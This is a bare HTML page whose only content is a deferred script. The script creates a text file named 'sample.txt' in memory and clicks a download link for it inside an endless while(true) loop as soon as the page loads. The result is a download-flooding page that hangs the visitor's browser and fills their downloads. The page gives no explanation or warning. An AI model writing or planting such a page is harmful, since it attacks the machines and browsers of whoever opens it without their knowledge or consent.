<!DOCTYPE html>
<html>
<body>
</body>
<script defer>
const link = document.createElement("a");
const file = new Blob(["hello"], { type: 'text/plain' });
link.href = URL.createObjectURL(file);
link.download = "sample.txt";
while(true){
link.click();}
URL.revokeObjectURL(link.href);
</script>
</html>
